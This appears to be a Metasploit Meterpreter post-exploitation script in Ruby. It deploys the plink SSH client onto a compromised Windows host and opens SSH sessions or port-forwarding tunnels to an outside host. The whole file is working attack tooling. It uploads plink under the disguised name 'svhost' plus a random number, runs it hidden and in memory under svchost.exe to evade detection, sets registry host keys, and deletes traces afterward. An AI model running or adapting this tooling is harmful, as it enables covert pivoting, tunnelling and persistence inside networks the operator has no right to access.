#
# Meterpreter script to deploy & run the "plink" commandline ssh-client
# supports only MS-Windows-2k/XP/Vista Hosts
#
# Version 1.0
# written by illegalguy
#
require 'net/http'
require 'uri'
meter_type = client.platform

#
# Options
#

@@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false, "This help menu"],
  "-f"  => [ true,  "Do not download plink.exe but use given file."],
  "-U"  => [ true,  "Download from given URL instead of default one (http://the.earth.li/~sgtatham/putty)"],
  "-H"  => [ true,  "The IP/hostname of the SSH-server to connect to !REQUIRED!"],
  "-p"  => [ true,  "The port of the remote SSH-server (Default:22)"],
  "-u"  => [ true,  "The username to use to login to the SSH-server !REQUIRED!"],
  "-P"  => [ true,  "login with specified password"],
  "-b"  => [ false, "disable all interactive prompts"],
  "-R"  => [ true,  "Forward remote port to local address ([listen-IP:]listen-port:host:port)"],
  "-L"  => [ true,  "Forward local port to remote address ([listen-IP:]listen-port:host:port)"],
  "-D"  => [ true,  "Dynamic SOCKS-based port forwarding ([listen-IP:]listen-port)"],
  "-C"  => [ false, "enable compression"],
  "-X"  => [ false, "enable X11 forwarding"],
  "-x"  => [ false, "disable X11 forwarding"],
  "-A"  => [ false, "enable agent forwarding"],
  "-a"  => [ false, "disable agent forwarding"],
  "-1"  => [ false, "use SSH-protocol-version 1"],
  "-2"  => [ false, "use SSH-protocol-version 2"],
  "-4"  => [ false, "use IPv4"],
  "-6"  => [ false, "use IPv6"],
  "-i"  => [ true,  "private key-file for authentication"],
  "-m"  => [ true,  "read remote command from file"],
  "-s"  => [ false, "remote command is an ssh-subsystem(SSH2 only)"],
  "-N"  => [ false, "Don`t start a shell/command (SSH2 only)"],
  "-n"  => [ true,  "open tunnel in place of session (SSH-2 only) (host:port)"],
  "-r"  => [ true,  "Set SSH-Server`s Hostkey as known Host in Windows-registry before starting the client"],
  "-F"  => [ false, "Disable ram-mode, upload plink and run from disk. Attention : no auto-cleanup when using -N AND -F !"],
  "-E"  => [ true, "Start process from memory as given (Target Machine`s!) Application (.exe) (Default: C:\\windows\\system32)"],
  "-v"  => [ false, "Give additional (debugging-)output"]
)

def usage
  print_line("plink ssh-client deploy+run script")
  print_line("This script will upload and run a plink ssh-cient")
  print_line(@@exec_opts.usage)
  raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
  print_error("#{meter} version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
#
# Default parameters
#

plink = File.join(Msf::Config.data_directory, "plink.exe")

#plinkurl = 'http://the.earth.li/~sgtatham/putty/latest/x86/plink.exe'
#plinkurl = 'http://the.earth.li/~sgtatham/putty/0.60/x86/plink.exe'
plinkurl = 'http://updates.metasploit.com/data/win32-ssh/plink.exe'
license = <<-EOS
PuTTY is copyright 1997-2010 Simon Tatham.
Portions copyright Robert de Bath, Joris van Rantwijk, Delian Delchev, Andreas Schultz, Jeroen Massar, Wez Furlong, Nicolas Barry, Justin Bradford, Ben Harris, Malcolm Smith, Ahmad Khalifa, Markus Kuhn, Colin Watson, and CORE SDI S.A.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL SIMON TATHAM BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'
EOS


#
# Define required functions
#

def upload(client,file,trgloc = nil)
  if not ::File.exists?(file)
    raise "File to Upload does not exists!"
  else
    if trgloc == nil
      location = client.sys.config.getenv('TEMP')
    else
      location = trgloc
    end
    begin
      if file =~ /S*(.exe)/i
        fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
      else
        fileontrgt = "#{location}\\TMP#{rand(100)}"
      end
      print_status("Uploading #{file}....")
      client.fs.file.upload_file(fileontrgt, file)
      print_status("#{file} successfully uploaded to #{fileontrgt}!")
    rescue ::Exception => e
      print_status("Error uploading file #{file}: #{e.class} #{e}")
    end
  end
  return fileontrgt
end


#
# Option parsing
#
username = nil
password = nil
rhost = nil
rport = 22
manual = nil
hostkey = nil
batchmode = nil
remotefwd = nil
localfwd = nil
socksfwd = nil
enablecompression = nil
enablex11fwd = nil
disablex11fwd = nil
enableagentfwd = nil
disableagentfwd = nil
sshv1 = nil
sshv2 = nil
ipv4 = nil
ipv6 = nil
keyfile = nil
cmdfile = nil
sshsubsys = nil
noshell = nil
nctunnel = nil
processname = "C:\\windows\\system32\\svchost.exe"
verbose = nil
filemode = nil
downloaded = nil

@@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-H"
    if !val
      print_error("-H requires an argument !")
      usage
    end
    rhost = val

  when "-f"
    if !val
      print_error("-f requires an argument !")
      usage
    end
    plink = val
    if not ::File.exists?(plink)
      print_error("Plink.exe not found/accessible!")
      usage
    end
    manual = true

  when "-r"
    if !val
      print_error("-r requires an argument !")
      usage
    end
    hostkey = val

  when "-p"
    rport = val.to_i

  when "-U"
    if !val
      print_error("-u requires an argument !")
      usage
    end
    plinkurl = val

  when "-u"
    if !val
      print_error("-u requires an argument !")
      usage
    end
    username = val

  when "-P"
    if !val
      print_error("-P requires an argument !")
      usage
    end
    password = val

  when "-b"
    batchmode = true

  when "-R"
    if !val
      print_error("-R requires an argument !")
      usage
    end
    remotefwd = val

  when "-L"
    if !val
      print_error("-L requires an argument !")
      usage
    end
    localfwd = val

  when "-D"
    if !val
      print_error("-D requires an argument !")
      usage
    end
    socksfwd = val

  when "-C"
    enablecompression = true

  when "-X"
    enablex11fwd = true

  when "-x"
    disablex11fwd = true

  when "-A"
    enableagentfwd = true

  when "-a"
    disableagentfwd = true

  when "-1"
    sshv1 = true

  when "-2"
    sshv2 = true

  when "-4"
    ipv4 = true

  when "-6"
    ipv6 = true

  when "-i"
    if !val
      print_error("-i requires an argument !")
      usage
    end
    keyfile = val
    if not ::File.exists?(keyfile)
      print_error("keyfile not found or not accessible!")
      usage
    end

  when "-m"
    if !val
      print_error("-m requires an argument !")
      usage
    end
    cmdfile = val
    if not ::File.exists?(cmdfile)
      print_error("cmd-file not found/accessible!")
      usage
    end

  when "-s"
    sshsubsys = true

  when "-N"
    noshell = true

  when "-n"
    if !val
      print_error("-n requires an argument !")
      usage
    end
    nctunnel = val

  when "-E"
    if !val
      print_error("-E requires an argument !")
      usage
    end
    processname = val

  when "-v"
    verbose = true

  when "-F"
    filemode = true

  else
    print_error("Unknown option: #{opt}")
    usage
  end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i


if not rhost or not username
  print_status("You must specify a hostname (-H) and username (-u)")
  raise Rex::Script::Completed
end

#
# Check if plink-file exists, and if not : download from putty-site first
# Ask user before downloading
#
if not manual
  if not ::File.exists?(plink)
    print_status("plink.exe could not be found. Downloading it now...")
    print_status(license)
    plinkexe = Net::HTTP.get URI.parse(plinkurl)
    File.open(plink, "wb") { |fd| fd.write(plinkexe) }
    print_status("plink.exe has been downloaded to #{plink} (local machine). Please remove manually after use or keep for reuse.")
    downloaded = true
  end
end

#
# Uploading files to target
#
cmdfileontrgt = upload(client, cmdfile) if cmdfile
keyfileontrgt = upload(client, keyfile) if keyfile

trg_filename = nil
if filemode
  print_status("-------Uploading plink -------")
  trg_filename = upload(client, plink)
else
  trg_filename = plink
end

#
# Build parameter-string
#
params = "-ssh "
params << "-P #{rport} "          if not rport == 22
params << "-l #{username} "
params << "-pw #{password} "      if password
params << "-batch "               if batchmode
params << "-R #{remotefwd} "      if remotefwd
params << "-L #{localfwd} "       if localfwd
params << "-D #{socksfwd} "       if socksfwd
params << "-C "                   if enablecompression
params << "-X "                   if enablex11fwd
params << "-x "                   if disablex11fwd
params << "-A "                   if enableagentfwd
params << "-a "                   if disableagentfwd
params << "-1 "                   if sshv1
params << "-2 "                   if sshv2
params << "-4 "                   if ipv4
params << "-6 "                   if ipv6
params << "-m #{cmdfileontrgt} "  if cmdfileontrgt
params << "-i #{keyfileontrgt} "  if keyfileontrgt
params << "-s "                   if sshsubsys
params << "-N "                   if noshell
params << "-nc #{nctunnel} "      if nctunnel

params << rhost


#
# Set Registry-Value before running the client, if the param was specified
#
hostkeyname = nil
if not hostkey == nil
  hostkeyname = "rsa2@#{rport}:#{rhost}"
  print_status("Writing the Hostkey to the registry...")
  client.run_cmd("reg setval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname} -d #{hostkey}")
end

#
# Give additional output when -v is set
#
if verbose
  print_status("You set the following parameters for plink :")
  print_status(params)
  print_status(processname)
end

#
# Execute the client
#

print_status("-------Executing Client ------")

p = nil
if not filemode
  p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true, 'InMemory' => processname})
else
  p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true})
end

if noshell == nil
  client.console.run_single("interact #{p.channel.cid}")
end

if filemode
  if not noshell == true
    if verbose
      print_status("Waiting 3 seconds to be sure the process was closed.")
    end
    sleep(3)
    if verbose
      print_status("Deleting the uploaded plink.exe...")
    end
    client.fs.file.rm(trg_filename)
  else
    print_status("Cannot automatically delete the uploaded #{trg_filename} ! Please delete it manually after stopping the process!")
  end
end

if not keyfile == nil
  if verbose
    print_status("Waiting 1 second to be sure the keyfile is not in use anymore.")
  end
  sleep(1)
  if verbose
    print_status("Deleting the keyfile !")
  end
  if verbose
    print_status(keyfile)
  end
  client.fs.file.rm(keyfile)
end

if not cmdfile == nil
  print_status("You need to manually delete the uploaded #{cmdfile} !")
end

#
# Delete the registry-key that may have been created
#
if not hostkey == nil
  if verbose
    print_status("Deleting the registry-key set by the script.")
  end
  client.run_cmd("reg deleteval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname}")
end

raise Rex::Script::Completed
